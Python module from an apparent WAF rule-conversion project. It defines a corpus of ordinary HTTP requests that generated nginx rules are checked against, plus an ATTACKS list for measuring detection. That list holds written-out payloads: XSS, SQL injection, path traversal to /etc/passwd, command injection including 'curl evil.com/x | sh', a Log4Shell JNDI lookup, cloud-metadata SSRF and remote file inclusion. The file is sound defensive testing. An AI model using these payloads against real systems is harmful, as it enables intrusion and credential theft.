"""
The ordinary traffic a generated rule must not refuse, and the attacks it should.

A converted CRS rule keeps its regular expression and loses everything else: the
transformations it was written to run after, the specific target it was aimed
at, and the anomaly score that let several weak signals accumulate before
anything was refused. What survives is one regex matched against one raw request
component. Whether that is safe to block on is a question about this project's
output, not about CRS, so it is measured rather than assumed.

`BENIGN` is traffic that must never be refused. The nginx backend checks every
candidate rule against it and refuses to emit one that matches, which is why
this module sits beside the backends rather than under tests/: the exclusion
is part of generating, not part of checking afterwards. It is what stands between
an automatic rule update and users being refused, so it is grown on purpose.

Each entry says what it is (`category`) and why it is there (`why`, one line), so
that a rule it excludes can be judged: was the request ordinary, or the rule
wrong? The categories are in `CATEGORIES`. They are what a false positive looks
like in practice, not a volume to reach: a sentence that contains the word
`select`, a JWT in a query string, a file called `report.final.v2.pdf`, text in a
script other than Latin.

What goes in:

  * made up, or taken from public documentation (the OAuth and JWT examples are
    the ones in RFC 6749 and jwt.io), never real traffic;
  * hosts are `example.*`, addresses are in the documentation ranges, people are
    `@example.com`;
  * one more entry when a false positive is reported, before the fix: see
    CONTRIBUTING.md. The entry fails first, then it passes.

An entry can carry a `method` and a `body`. No backend matches a body yet, so the
nginx check ignores it, and the tests that run a real server send it.

`ATTACKS` is traffic that should be refused, and it only reports: a rule is
never included because it caught something. Each entry appears twice in the
measurement, once percent-encoded as a browser would send it and once in clear,
because the gap between the two is exactly the transformation chain nginx cannot
apply.

Both are deliberately unexotic. The point is not to be exhaustive, it is to be
the kind of traffic a small site sees in an hour.
"""

import json
import re
import urllib.parse
from typing import Callable, Dict, Iterable, List, Optional

# What every entry sends unless it says otherwise. A real browser, a real host.
_DEFAULTS = {
    "user_agent": (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
    ),
    "host": "example.com",
    "referer": "https://example.com/",
    "content_type": "",
    "method": "GET",
    "body": "",
}

# The request component each rule location is matched against, by the nginx
# variable the nginx backend keys its map on.
VARIABLE_FIELDS = {
    "$request_uri": "request_uri",
    "$args": "args",
    "$http_user_agent": "user_agent",
    "$http_host": "host",
    "$http_referer": "referer",
    "$http_content_type": "content_type",
}


def request(name: str, path: str, query: str = "", **overrides) -> Dict[str, str]:
    """
    Builds one request, as the set of components nginx exposes as variables.

    Args:
        name: What the request represents, used in reports.
        path: The path, already in the form it goes on the wire.
        query: The query string, without the leading `?`.
        **overrides: Any of user_agent, host, referer, content_type, method, body.

    Returns:
        A dict with `name` and one key per matchable request component.
    """
    entry = dict(_DEFAULTS)
    entry.update(overrides)
    entry["name"] = name
    entry["path"] = path
    entry["args"] = query
    entry["request_uri"] = f"{path}?{query}" if query else path
    return entry


# What a false positive looks like, by kind. An entry belongs to one.
CATEGORIES: Dict[str, str] = {
    "navigation": "Ordinary pages, assets, paths and list views: most of what a site serves.",
    "search": "Search boxes, including sentences with words that are also SQL or shell.",
    "prose": "Free text: comments, contact forms, reviews, with the punctuation people type.",
    "api": "JSON and URL-encoded APIs: filters, nested and array parameters, bodies.",
    "auth": "OAuth and OpenID Connect, JWTs, magic links, redirects that carry a URL.",
    "graphql": "GraphQL queries, over GET and POST.",
    "files": "File names and paths: dots, versions, percent-encoding, path parameters.",
    "clients": "Who is asking: real browsers, internal services, hosts.",
    "bots": "Automated clients a site wants: search engines, link previews, uptime monitors.",
    "libraries": "HTTP libraries sending their default User-Agent: a bad-bot list refuses these on purpose.",
    "tracking": "Referers and tracking parameters, which are long and full of `&` and `=`.",
    "international": "Text that is not Latin or not English, percent-encoded.",
}


def benign(category: str, name: str, why: str, path: str, query: str = "",
           **overrides) -> Dict[str, str]:
    """
    Builds one ordinary request: `request` with what it is and why it is here.

    Args:
        category: A key of CATEGORIES.
        name: What the request represents, used in reports.
        why: One line on why it is in the corpus: what it could be mistaken for.
        path: The path, already in the form it goes on the wire.
        query: The query string, without the leading `?`.
        **overrides: As for `request`.
    """
    entry = request(name, path, query, **overrides)
    entry["category"] = category
    entry["why"] = why
    return entry


_FIREFOX = "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
_SAFARI_IOS = ("Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 "
               "(KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1")
_EDGE = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
         "Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0")
_CHROME_ANDROID = ("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.0.0 Mobile Safari/537.36")
# The example token from jwt.io: a signed JWT with three dot-separated segments.
_JWT = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwi"
        "aWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")

# Ordinary requests. A rule that matches any of these cannot block.
BENIGN: List[Dict[str, str]] = [
    # --- navigation -----------------------------------------------------------
    benign("navigation", "home", "the most common request there is", "/"),
    benign("navigation", "static asset", "a stylesheet with a cache-busting parameter",
           "/static/app.css", "v=3"),
    benign("navigation", "article with a dated path", "a path made of digits and hyphens",
           "/blog/2026/09/what-we-learned"),
    benign("navigation", "pagination", "paging parameters, ampersand separated",
           "/api/v1/users", "page=2&per_page=50"),
    benign("navigation", "uuid in the path", "a long hexadecimal identifier",
           "/orders/550e8400-e29b-41d4-a716-446655440000"),
    benign("navigation", "numeric id", "an id in a query string", "/products", "id=12345"),
    benign("navigation", "sort order", "`order` is also SQL", "/products", "sort=price&order=desc"),
    benign("navigation", "date range", "hyphens and digits in a value",
           "/reports", "from=2026-01-01&to=2026-09-30"),
    benign("navigation", "boolean flags", "`true` and `false` as values",
           "/settings", "notify=true&dark=false"),
    benign("navigation", "path with underscores", "underscores in a path", "/docs/getting_started"),
    benign("navigation", "versioned asset", "a content hash in a file name", "/assets/main.4f3a2b1c.js"),
    benign("navigation", "feed", "an xml file name", "/feed.xml"),
    benign("navigation", "sitemap", "an xml file name", "/sitemap.xml"),
    benign("navigation", "robots", "what every crawler asks for", "/robots.txt"),
    benign("navigation", "health check", "what a load balancer asks for", "/healthz"),
    benign("navigation", "locale prefix", "a language code as the first path segment", "/it/prodotti"),
    benign("navigation", "trailing slash", "a directory path", "/products/shoes/"),
    benign("navigation", "empty parameters", "a form submitted with nothing filled in",
           "/list", "filter=&page=&sort="),
    benign("navigation", "long query string", "a faceted listing: many parameters, some repeated",
           "/products", "color=red&color=blue&size=m&size=l&brand=a&brand=b&sort=price&page=3&per_page=24"),

    # --- search ---------------------------------------------------------------
    benign("search", "search box", "a two word query", "/search", "q=hello+world"),
    benign("search", "search with punctuation", "an apostrophe, percent-encoded",
           "/search", "q=what%27s+new"),
    benign("search", "search with an ampersand", "`&` inside a value, encoded",
           "/search", "q=tom+%26+jerry"),
    benign("search", "select in a sentence", "`select` is SQL, and also English",
           "/search", "q=select+the+best+laptop+for+students"),
    benign("search", "union in a sentence", "`union` is SQL, and also geography",
           "/search", "q=union+of+european+countries"),
    benign("search", "drop table as a question", "what a developer searches for, not what they send",
           "/search", "q=how+to+drop+a+table+in+postgresql"),
    benign("search", "insert into in a sentence", "two SQL keywords in a row, about a spreadsheet",
           "/search", "q=insert+into+spreadsheet+cell+tutorial"),
    benign("search", "or and numbers", "`1 or 2` in prose", "/search", "q=tic+tac+toe+for+1+or+2+players"),
    benign("search", "semicolon in a shell question", "`;` as the thing being asked about",
           "/search", "q=what+does+%3B+do+in+bash"),
    benign("search", "ampersands in a shell question", "`&&` as the thing being asked about",
           "/search", "q=what+does+%26%26+do+in+bash"),
    benign("search", "shell commands named", "`grep`, `sort` and a pipe, in a question",
           "/search", "q=how+to+use+grep+with+a+pipe+to+sort"),
    benign("search", "sql comment marker in a question", "`--` as the thing being asked about",
           "/search", "q=what+does+--+mean+in+sql"),
    benign("search", "quoted title", "double quotes, percent-encoded",
           "/search", "q=%22the+great+gatsby%22+summary"),

    # --- prose ----------------------------------------------------------------
    benign("prose", "contact form message", "an apostrophe, a comma and an exclamation mark in a body",
           "/contact", method="POST", content_type="application/x-www-form-urlencoded",
           body="name=Mario+Rossi&message=Hello%2C+I%27d+like+to+ask+about+your+pricing%21"),
    benign("prose", "review with quotes", "double quotes and `&` around a phrase",
           "/reviews", method="POST", content_type="application/x-www-form-urlencoded",
           body="review=%22Best+fish+%26+chips%22+in+town&stars=5"),
    benign("prose", "comment with parentheses", "an apostrophe and parentheses in prose",
           "/comment", "text=It%27s+great+%28really%29+I+loved+it"),
    benign("prose", "a surname with an apostrophe", "O'Brien: encodeURIComponent leaves the apostrophe as it is",
           "/customers", "name=O'Brien+and+sons"),
    benign("prose", "steps with semicolons", "`;` between sentences",
           "/notes", "text=Step+1%3B+step+2%3B+step+3."),
    benign("prose", "less than in a sentence", "`<` as a comparison, not a tag",
           "/notes", "text=if+x+%3C+5+then+stop"),
    benign("prose", "an entity named in a sentence", "`&amp;` as the thing being explained",
           "/notes", "text=use+%26amp%3B+for+an+ampersand+in+html"),
    benign("prose", "a link in a message", "a url inside text",
           "/notes", "text=see+https%3A%2F%2Fexample.com%2Fdocs+for+details"),
    benign("prose", "a signature", "`--` on its own line, as mail signatures have",
           "/contact", method="POST", content_type="application/x-www-form-urlencoded",
           body="message=Thanks%0D%0A--%0D%0AMario%0D%0ASent+from+my+phone"),

    # --- api ------------------------------------------------------------------
    benign("api", "comma separated list", "commas in a value", "/api/v1/items", "fields=id,name,price"),
    benign("api", "json-ish value", "braces and quotes, percent-encoded",
           "/api/v1/filter", "where=%7B%22status%22%3A%22open%22%7D"),
    benign("api", "percent in a value", "an encoded `%` sign", "/stats", "growth=15%25"),
    benign("api", "plus in a value", "an encoded `+`", "/calc", "expr=1%2B1"),
    benign("api", "a json api call", "a JSON content type", "/api/v1/orders",
           content_type="application/json"),
    benign("api", "a form post", "a form content type", "/contact",
           content_type="application/x-www-form-urlencoded"),
    benign("api", "array parameters", "`[]` in a name, encoded",
           "/api/v1/items", "ids%5B%5D=1&ids%5B%5D=2&ids%5B%5D=3"),
    benign("api", "nested parameters", "brackets in a name, encoded",
           "/api/v1/items", "filter%5Bstatus%5D=open&filter%5Bowner%5D=me"),
    benign("api", "postgrest query", "`select` and `order` as parameter names",
           "/items", "select=id,name&order=price.desc&limit=10"),
    benign("api", "odata filter", "`and`, `eq`, `gt` and quotes in a value",
           "/odata/Products", "$filter=Price+gt+20+and+Category+eq+%27Books%27&$top=10"),
    benign("api", "a range", "two dots between numbers", "/api/v1/items", "price=10..50"),
    benign("api", "a timestamp", "colons in a value, encoded", "/api/v1/events", "since=2026-09-30T12%3A00%3A00Z"),
    benign("api", "a semantic version", "dots, a hyphen and an encoded plus",
           "/api/v1/releases", "version=1.2.3-beta.1%2Bbuild.5"),
    benign("api", "base64 value", "`=` padding, encoded", "/api/v1/decode", "data=SGVsbG8gd29ybGQ%3D"),
    benign("api", "json body", "a JSON document in a body",
           "/api/v1/orders", method="POST", content_type="application/json",
           body='{"items":[{"sku":"A-1","qty":2}],"note":"leave at the door"}'),
    benign("api", "repeated parameter", "the same name twice",
           "/api/v1/items", "tag=red&tag=blue"),

    # --- auth -----------------------------------------------------------------
    benign("auth", "email in a parameter", "`@` and `.` in a value, encoded",
           "/signup", "email=mario.rossi%40example.com"),
    benign("auth", "absolute url in a parameter", "a url inside a url",
           "/share", "url=https%3A%2F%2Fexample.com%2Fa"),
    benign("auth", "return path", "a path and a query inside a query",
           "/login", "next=%2Fdashboard%3Ftab%3Dbilling"),
    benign("auth", "api key style token", "a token with dots", "/api/v1/me",
           "token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0"),
    benign("auth", "oauth authorization request", "RFC 6749 parameters, with a redirect uri",
           "/oauth/authorize", "response_type=code&client_id=abc123&scope=openid+profile+email"
           "&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback&state=xyz"),
    benign("auth", "oauth callback", "the authorization code from the RFC 6749 examples",
           "/callback", "code=SplxlOBeZQQYbYS6WxSbIA&state=af0ifjsldkj"),
    benign("auth", "signed jwt", "the jwt.io example: three base64url segments", "/callback",
           f"id_token={_JWT}"),
    benign("auth", "saml relay state", "a path in a parameter", "/saml/acs", "RelayState=%2Fapp%2Fhome"),
    benign("auth", "logout redirect", "a full url as a value",
           "/logout", "post_logout_redirect_uri=https%3A%2F%2Fapp.example.com%2F"),
    benign("auth", "magic link", "a uuid token", "/login/verify", "token=3f9a1c2e-7b4d-4e8a-9c31-5d2f6a8b0e17"),
    benign("auth", "reset link with a plus address", "`+` and `@` in an email, encoded",
           "/reset", "email=mario%2Bnews%40example.com&token=9a8b7c6d"),
    benign("auth", "nested redirect", "a whole url with its own query, encoded twice over",
           "/login", "next=%2Fsearch%3Fq%3Dshoes%26page%3D2"),

    # --- graphql --------------------------------------------------------------
    benign("graphql", "graphql query", "braces in a value, encoded", "/graphql",
           "query=%7Bviewer%7Blogin%7D%7D"),
    benign("graphql", "graphql with variables", "a query with `$` and a JSON variables parameter",
           "/graphql", "query=query+Repo%28%24owner%3AString%21%29%7Brepository%28owner%3A%24owner%29"
           "%7Bname%7D%7D&variables=%7B%22owner%22%3A%22octocat%22%7D"),
    benign("graphql", "graphql mutation", "a mutation in a JSON body, with escaped quotes",
           "/graphql", method="POST", content_type="application/json",
           body='{"query":"mutation { addItem(name: \\"x\\") { id } }"}'),

    # --- files ----------------------------------------------------------------
    benign("files", "file download", "a spreadsheet file name", "/files/quarterly-report.xlsx"),
    benign("files", "versioned tarball", "dots in a name", "/downloads/app-1.2.3.tar.gz"),
    benign("files", "several dots", "a name made of dots", "/files/report.final.v2.pdf"),
    benign("files", "well-known path", "a path that starts with a dot",
           "/.well-known/acme-challenge/abc123"),
    benign("files", "space and parentheses in a name", "percent-encoded", "/files/My%20Report%20%282026%29.pdf"),
    benign("files", "plus and comma in a name", "unencoded `+` and `,`", "/files/a+b,c.txt"),
    benign("files", "image with a density suffix", "`@2x` and dimensions", "/img/photo_800x600@2x.jpg"),
    benign("files", "source map", "a double extension", "/assets/app.js.map"),
    benign("files", "path parameter", "a `;` in a path, as java servers write it",
           "/cart;jsessionid=0A1B2C3D4E5F", "x=1"),

    # --- clients --------------------------------------------------------------
    benign("clients", "firefox on linux", "a browser: `Gecko`, a date and a version in its agent",
           "/", user_agent=_FIREFOX),
    benign("clients", "safari on an iphone", "a mobile browser", "/", user_agent=_SAFARI_IOS),
    benign("clients", "edge on windows", "a browser with two engines in its name", "/", user_agent=_EDGE),
    benign("clients", "chrome on android", "a mobile browser", "/", user_agent=_CHROME_ANDROID),

    # --- bots -----------------------------------------------------------------
    # A bad-bot list refuses automation. It must not refuse these: a search engine
    # that cannot crawl, a link that shows no preview and a monitor that reports the
    # site down are what its owner pays for (#78). Real agents, from each operator's
    # own documentation, with the url they publish.
    benign("bots", "googlebot", "a crawler: its agent names a url, and says it is a bot",
           "/", user_agent="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
           referer=""),
    benign("bots", "bingbot", "a crawler with a url in its agent",
           "/", user_agent="Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
           referer=""),
    benign("bots", "duckduckbot", "a crawler whose name ends in `bot`",
           "/", user_agent="DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)", referer=""),
    benign("bots", "baiduspider", "a crawler that names `spider` and its own domain",
           "/", user_agent="Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
           referer=""),
    benign("bots", "yandexbot", "a crawler whose name ends in `bot`",
           "/", user_agent="Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", referer=""),
    benign("bots", "applebot", "a crawler inside a Safari agent",
           "/", user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 "
                           "(KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 "
                           "(Applebot/0.1; +http://www.apple.com/go/applebot)", referer=""),
    benign("bots", "slack link preview", "a bot that fetches a page a person pasted",
           "/article", user_agent="Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)", referer=""),
    benign("bots", "facebook link preview", "a bot that fetches a page a person shared",
           "/article", user_agent="facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
           referer=""),
    benign("bots", "twitterbot", "a bot that fetches a page a person posted",
           "/article", user_agent="Twitterbot/1.0", referer=""),
    benign("bots", "linkedinbot", "a link preview that names a library too",
           "/article", user_agent="LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
           referer=""),
    benign("bots", "discord link preview", "a link preview whose agent begins `Disco`",
           "/article", user_agent="Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
           referer=""),
    benign("bots", "whatsapp link preview", "a link preview from a messenger",
           "/article", user_agent="WhatsApp/2.23.20", referer=""),
    benign("bots", "telegram link preview", "a link preview from a messenger",
           "/article", user_agent="TelegramBot (like TwitterBot)", referer=""),
    benign("bots", "better uptime", "a monitor with `Bot` in its name",
           "/healthz", user_agent="Better Uptime Bot", referer=""),
    benign("bots", "uptimerobot", "a monitor with `uptime` and `robot` in its name",
           "/healthz", user_agent="Mozilla/5.0 (compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)",
           referer=""),
    benign("bots", "pingdom", "a monitor that names its own service",
           "/healthz", user_agent="Pingdom.com_bot_version_1.4_(http://www.pingdom.com/)", referer=""),
    benign("bots", "statuscake", "a monitor that names its own service",
           "/healthz", user_agent="Mozilla/5.0 (compatible; StatusCake_Pagespeed_indev)", referer=""),

    # --- libraries ------------------------------------------------------------
    # Ordinary for an API and for a script, and what a bad-bot list exists to refuse:
    # the first thing a scraper does is run one with its default agent. So the lists
    # refuse these on purpose, and docs/badbots.md says how to allow them.
    benign("libraries", "curl", "a command line client", "/api/v1/me", user_agent="curl/8.7.1", referer=""),
    benign("libraries", "python requests", "a library, scripted", "/api/v1/me",
           user_agent="python-requests/2.32.3", referer=""),
    benign("libraries", "go http client", "a library, scripted", "/api/v1/me",
           user_agent="Go-http-client/2.0", referer=""),

    benign("clients", "a metrics scraper", "an internal client", "/metrics",
           user_agent="Prometheus/2.53.0", referer=""),
    benign("clients", "a json api call from a service", "a JSON content type and a service agent",
           "/api/v1/orders", user_agent="orders-service/3.4 (+https://example.com)",
           content_type="application/json", referer=""),
    benign("clients", "a subdomain", "a host that is not the bare domain", "/", host="api.example.com"),
    benign("clients", "a host with a port", "`:` in a host", "/", host="example.com:8443"),

    # --- tracking -------------------------------------------------------------
    benign("tracking", "campaign tracking", "utm and click-id parameters",
           "/landing", "utm_source=newsletter&utm_medium=email&fbclid=abc123"),
    benign("tracking", "an external referer", "a referer with a query string",
           "/article", referer="https://news.ycombinator.com/item?id=12345"),
    benign("tracking", "a search engine referer", "a referer that is a whole search, with `&` and `=`",
           "/", referer="https://www.google.com/search?q=example+widgets&oq=example+widgets"
           "&sourceid=chrome&ie=UTF-8"),
    benign("tracking", "a social referer", "a referer that wraps another url, encoded",
           "/article", referer="https://l.facebook.com/l.php?u=https%3A%2F%2Fexample.com%2Farticle"
           "%3Futm_source%3Dfb&h=AT0abc123&s=1"),
    benign("tracking", "an app referer", "a referer that is not http", "/",
           referer="android-app://com.google.android.gm/"),
    benign("tracking", "an ad click id", "a long opaque value",
           "/landing", "gclid=Cj0KCQjwq7a2BhDTARIsAB0dLCvoqJh1z1wFgY4"),

    # --- international --------------------------------------------------------
    benign("international", "accented permalink", "a path with percent-encoded utf-8", "/citt%C3%A0/genova"),
    benign("international", "italian", "accented letters in a query", "/search", "q=perch%C3%A9+il+cielo+%C3%A8+blu"),
    benign("international", "german", "umlauts and sharp s", "/search", "q=gr%C3%BC%C3%9Fe+aus+m%C3%BCnchen"),
    benign("international", "japanese", "kanji: nine percent-encoded bytes where Latin would have three", "/search", "q=%E6%9D%B1%E4%BA%AC+%E5%A4%A9%E6%B0%97"),
    benign("international", "arabic", "a right-to-left script", "/search", "q=%D9%85%D8%B1%D8%AD%D8%A8%D8%A7"),
    benign("international", "cyrillic path", "a path in a non-latin script",
           "/%D0%BD%D0%BE%D0%B2%D0%BE%D1%81%D1%82%D0%B8"),
    benign("international", "an emoji", "a four byte character", "/search", "q=%F0%9F%98%80+smile"),
]

# Requests that should be refused. Each names the class of attack it stands for.
ATTACKS: List[Dict[str, str]] = [
    request("xss script tag", "/search", "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
    request("xss img onerror", "/search", "q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"),
    request("xss javascript uri", "/go", "next=javascript%3Aalert%281%29"),
    request("sqli union select", "/products",
            "id=1%27+UNION+SELECT+password+FROM+users--"),
    request("sqli tautology", "/login", "user=admin%27+OR+%271%27%3D%271"),
    request("sqli sleep", "/products", "id=1+AND+SLEEP%285%29"),
    request("path traversal", "/download", "file=..%2F..%2F..%2Fetc%2Fpasswd"),
    request("path traversal encoded", "/download", "file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    request("rce semicolon", "/ping", "host=127.0.0.1%3Bcat+%2Fetc%2Fpasswd"),
    request("rce backtick", "/ping", "host=%60id%60"),
    request("rce pipe to shell", "/exec", "cmd=curl+evil.com%2Fx+%7C+sh"),
    request("log4shell jndi", "/", "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D"),
    request("ssrf to localhost", "/fetch", "url=http%3A%2F%2F127.0.0.1%3A8080%2Fadmin"),
    request("ssrf to metadata", "/fetch",
            "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"),
    request("lfi php wrapper", "/view",
            "page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex"),
    request("rfi remote include", "/view", "page=http%3A%2F%2Fevil.com%2Fshell.txt"),
    request("null byte", "/view", "file=index.php%00.jpg"),
    request("sensitive file", "/.env"),
    request("git directory", "/.git/config"),
    request("web shell", "/uploads/c99.php"),
    request("scanner user agent", "/", user_agent="sqlmap/1.8#stable"),
]


def _leaves(value) -> List[str]:
    """The scalar values of a parsed JSON document, as text, in order."""
    if isinstance(value, dict):
        return [leaf for item in value.values() for leaf in _leaves(item)]
    if isinstance(value, list):
        return [leaf for item in value for leaf in _leaves(item)]
    return [] if value is None else [str(value)]


def arguments(entry: Dict[str, str]) -> List[str]:
    """
    What ModSecurity's `ARGS` holds for a request: the decoded value of each parameter
    of the query string, and of a form body. It does not hold the raw string nginx's
    `$args` is, and a rule that reads it sees `<script>` where the request said `%3Cscript%3E`.

    A JSON body is in it too, one value for each leaf, when the deployment has
    ModSecurity's JSON body processor on (the recommended configuration does, for
    `application/json`). Whether it has is not for a rule file to know, so a rule is
    checked as if it did: that can leave a rule out that never would have refused
    anything, and cannot let one in that refuses an ordinary JSON request.
    """
    found = [value for _, value in urllib.parse.parse_qsl(entry["args"], keep_blank_values=True)]
    content_type = entry["content_type"].lower()
    if entry["body"] and content_type.startswith("application/x-www-form-urlencoded"):
        found += [value for _, value in urllib.parse.parse_qsl(entry["body"], keep_blank_values=True)]
    elif entry["body"] and "json" in content_type:
        try:
            found += _leaves(json.loads(entry["body"]))
        except ValueError:
            pass
    return found


def first_ordinary_match(pattern: str, field: str, ignore_case: bool = False,
                         view: Optional[Callable[[Dict[str, str]], Iterable[str]]] = None) -> Optional[str]:
    """
    The name of the first ordinary request whose `field` an expression matches.

    This is the check that decides what a backend may write. A converted rule has
    lost the transformations it was written to run after, so an expression that is
    precise against a decoded value can be indiscriminate against a raw one, and
    whether a given rule survives that cannot be reasoned about rule by rule: it is
    measured against BENIGN.

    Python's `re` stands in for the target's engine. They differ on syntax, which
    each backend's own check handles, not on what these expressions match.

    Args:
        pattern: The regular expression, as it will be written.
        field: A key of an entry: `args`, `user_agent`, ...
        ignore_case: Whether the match ignores case.
        view: What the target matches the pattern against, for a target that does not
            see the field as it was sent: the values of a request, from the entry. By
            default, the field itself.

    Returns:
        The `name` of the first matching request, None if it matches none, or if
        Python cannot compile it (an expression only the target's engine has).
    """
    from patterns.dialects import python_compile  # here: dialects imports nothing from this module

    expression = python_compile(pattern, re.IGNORECASE if ignore_case else 0)
    if expression is None:
        return None
    for entry in BENIGN:
        values = view(entry) if view else [entry[field]]
        if any(expression.search(value) for value in values):
            return entry["name"]
    return None


def wanted_user_agents() -> Dict[str, str]:
    """
    The User-Agent of every ordinary client a bad-bot list must not refuse.

    Every entry of BENIGN but the `libraries`: a browser, a search engine, a link
    preview, a monitor, an internal service. A library that sends its default agent
    is ordinary too, and is the one kind of client a bad-bot list refuses on purpose.

    Returns:
        The name of the entry, and its User-Agent, for each distinct agent.
    """
    found: Dict[str, str] = {}
    seen = set()
    for entry in BENIGN:
        agent = entry["user_agent"]
        if entry["category"] != "libraries" and agent and agent not in seen:
            seen.add(agent)
            found[entry["name"]] = agent
    return found
